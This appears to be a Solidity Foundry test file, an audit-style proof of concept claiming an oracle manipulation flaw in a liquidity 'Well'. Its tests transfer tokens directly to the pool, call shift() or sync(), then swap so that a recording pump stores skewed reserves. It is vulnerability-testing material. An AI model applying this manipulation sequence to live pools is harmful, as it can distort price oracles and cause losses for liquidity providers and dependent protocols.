// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import {TestHelper, Balances, ConstantProduct2, IERC20} from "test/TestHelper.sol";
import {IWell} from "src/interfaces/IWell.sol";
import {IWellErrors} from "src/interfaces/IWellErrors.sol";
import {IPump} from "src/interfaces/pumps/IPump.sol";
import {Call} from "src/interfaces/IWell.sol";
import {Aquifer} from "src/Aquifer.sol";

/**
 * @title OracleManipulationPump
 * @dev A pump that tracks reserve updates to demonstrate oracle manipulation vulnerability
 */
contract OracleManipulationPump is IPump {
    uint256[] public lastReserves;
    uint256 public updateCount;

    function update(uint256[] calldata reserves, bytes calldata) external override {
        lastReserves = reserves;
        updateCount++;
    }

    function getLastReserves() external view returns (uint256[] memory) {
        return lastReserves;
    }

    function getUpdateCount() external view returns (uint256) {
        return updateCount;
    }

    function reset() external {
        delete lastReserves;
        updateCount = 0;
    }
}

/**
 * @title ExploitTest
 * @dev Proof of Concept demonstrating oracle manipulation vulnerability in Well.shift() and Well.sync()
 */
contract ExploitTest is TestHelper {
    OracleManipulationPump maliciousPump;

    function setUp() public {
        // Deploy malicious pump that will track reserve updates
        maliciousPump = new OracleManipulationPump();

        // Set up well function first
        wellFunction = deployWellFunction();

        // Create pump call for malicious pump
        Call[] memory _pumpsWithOracle = new Call[](1);
        _pumpsWithOracle[0] = Call({
            target: address(maliciousPump),
            data: hex""
        });

        // Set up well with the malicious pump
        setupWell(2, wellFunction, _pumpsWithOracle);

        // Re-approve tokens for new well
        approveMaxTokens(user, address(well));
        approveMaxTokens(user2, address(well));

        // Mint additional tokens to user for manipulation
        mintTokens(user, 1000e18);
    }

    /**
     * @dev Test demonstrates oracle manipulation vulnerability via shift() function
     *
     * VULNERABILITY: shift() doesn't call _updatePumps() before updating reserves,
     * allowing attackers to manipulate oracle prices by:
     * 1. Using shift() to manipulate reserves in current block without updating pumps with previous reserves
     * 2. Performing swaps that trigger pump updates with manipulated reserves
     * 3. Oracle now reflects manipulated prices instead of true market prices
     */
    function test_exploit_oracle_manipulation_via_shift() public {
        // Get initial state - pump should have been updated with normal reserves during setupWell
        uint256 initialUpdateCount = maliciousPump.getUpdateCount();
        uint256[] memory initialReserves = maliciousPump.getLastReserves();

        // Verify initial state
        assertEq(initialReserves[0], 1000e18, "Initial token0 reserve should be 1000e18");
        assertEq(initialReserves[1], 1000e18, "Initial token1 reserve should be 1000e18");
        assertEq(initialUpdateCount, 1, "Pump should have been updated once during setupWell");

        // Step 1: Attacker manipulates pool by transferring tokens directly to well
        // This creates imbalance between actual balances and stored reserves
        uint256 manipulationAmount = 50e18; // Use smaller amount
        vm.startPrank(user); // User has tokens from setupWell
        tokens[0].transfer(address(well), manipulationAmount);
        vm.stopPrank();

        // Verify pool is now imbalanced in actual balance but reserves not updated yet
        uint256[] memory currentReserves = well.getReserves();
        assertEq(currentReserves[0], 1000e18, "Reserves still show old values (not updated yet)");
        assertEq(currentReserves[1], 1000e18, "Reserves still show old values (not updated yet)");

        // Step 2: Attacker calls shift() to update reserves to manipulated values
        // VULNERABILITY: shift() doesn't call _updatePumps() with previous reserves
        vm.startPrank(user);
        well.shift(tokens[1], 0, user);
        vm.stopPrank();

        // Verify shift() updated reserves but didn't update pump
        currentReserves = well.getReserves();
        assertTrue(currentReserves[0] > 1000e18, "Token0 reserves should have increased");
        assertTrue(currentReserves[1] < 1000e18, "Token1 reserves should have decreased");

        // CRITICAL VULNERABILITY CHECK: pump was NOT updated during shift()
        assertEq(maliciousPump.getUpdateCount(), initialUpdateCount, "Pump should NOT have been updated during shift()");

        // Step 3: Attacker performs a swap to trigger pump update with manipulated reserves
        // VULNERABILITY: swapFrom() calls _updatePumps() with manipulated reserves
        vm.startPrank(user);
        uint256 swapAmountIn = 1e18;
        uint256 minAmountOut = well.getSwapOut(tokens[0], tokens[1], swapAmountIn);
        well.swapFrom(tokens[0], tokens[1], swapAmountIn, minAmountOut, user, block.timestamp + 1000);
        vm.stopPrank();

        // Step 4: Verify oracle manipulation succeeded
        uint256[] memory manipulatedReserves = maliciousPump.getLastReserves();
        uint256 finalUpdateCount = maliciousPump.getUpdateCount();

        // Pump was updated with manipulated reserves during swap
        assertEq(finalUpdateCount, initialUpdateCount + 1, "Pump should have been updated once during swap");
        assertTrue(manipulatedReserves[0] > 1000e18, "Oracle now shows manipulated token0 reserves");
        assertTrue(manipulatedReserves[1] < 1000e18, "Oracle now shows manipulated token1 reserves");

        // The oracle now contains manipulated price data instead of true market prices
        // This demonstrates the vulnerability - oracle can be manipulated via shift()
    }

    /**
     * @dev Test demonstrates oracle manipulation vulnerability via sync() function
     *
     * Similar to shift(), sync() also doesn't call _updatePumps() before updating reserves
     */
    function test_exploit_oracle_manipulation_via_sync() public {
        // Reset pump state
        maliciousPump.reset();

        // Add initial liquidity to establish baseline
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1000e18;
        amounts[1] = 1000e18;
        vm.startPrank(user);
        well.addLiquidity(amounts, 0, user, block.timestamp + 1000);
        vm.stopPrank();

        uint256 initialUpdateCount = maliciousPump.getUpdateCount();

        // Step 1: Manipulate pool balances directly
        uint256 manipulationAmount = 50e18; // Use smaller amount
        vm.startPrank(user); // User has tokens
        tokens[0].transfer(address(well), manipulationAmount);
        vm.stopPrank();

        // Step 2: Call sync() to update reserves to manipulated values
        // VULNERABILITY: sync() doesn't call _updatePumps() with previous reserves
        vm.startPrank(user);
        well.sync();
        vm.stopPrank();

        // Verify sync() updated reserves but didn't update pump
        uint256[] memory currentReserves = well.getReserves();
        assertTrue(currentReserves[0] > 1000e18, "Token0 reserves should have increased via sync");

        // CRITICAL VULNERABILITY CHECK: pump was NOT updated during sync()
        assertEq(maliciousPump.getUpdateCount(), initialUpdateCount, "Pump should NOT have been updated during sync()");

        // Step 3: Perform swap to trigger pump update with manipulated reserves
        vm.startPrank(user);
        uint256 swapAmountIn = 1e18;
        uint256 minAmountOut = well.getSwapOut(tokens[0], tokens[1], swapAmountIn);
        well.swapFrom(tokens[0], tokens[1], swapAmountIn, minAmountOut, user, block.timestamp + 1000);
        vm.stopPrank();

        // Verify oracle manipulation succeeded
        uint256[] memory manipulatedReserves = maliciousPump.getLastReserves();
        assertTrue(manipulatedReserves[0] > 1000e18, "Oracle shows manipulated token0 reserves after sync+swap");
    }

    /**
     * @dev Test demonstrates that normal operations correctly update pumps
     * This shows the contrast - normal swaps DO update pumps with correct reserves
     */
    function test_normal_operations_correctly_update_pumps() public {
        // Reset pump state
        maliciousPump.reset();

        // Add initial liquidity
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 1000e18;
        amounts[1] = 1000e18;
        vm.startPrank(user);
        well.addLiquidity(amounts, 0, user, block.timestamp + 1000);
        vm.stopPrank();

        uint256 updateCountAfterLiquidity = maliciousPump.getUpdateCount();

        // Normal swap should correctly update pumps with current reserves
        vm.startPrank(user);
        uint256 swapAmountIn = 100e18;
        uint256 minAmountOut = well.getSwapOut(tokens[0], tokens[1], swapAmountIn);
        well.swapFrom(tokens[0], tokens[1], swapAmountIn, minAmountOut, user, block.timestamp + 1000);
        vm.stopPrank();

        // Verify pump was updated correctly
        assertEq(maliciousPump.getUpdateCount(), updateCountAfterLiquidity + 1, "Pump should be updated during normal swap");

        uint256[] memory reservesAfterSwap = maliciousPump.getLastReserves();
        // Reserves should be reasonable (not manipulated)
        assertTrue(reservesAfterSwap[0] > 900e18 && reservesAfterSwap[0] < 1100e18, "Token0 reserves should be reasonable");
        assertTrue(reservesAfterSwap[1] > 900e18 && reservesAfterSwap[1] < 1100e18, "Token1 reserves should be reasonable");
    }
}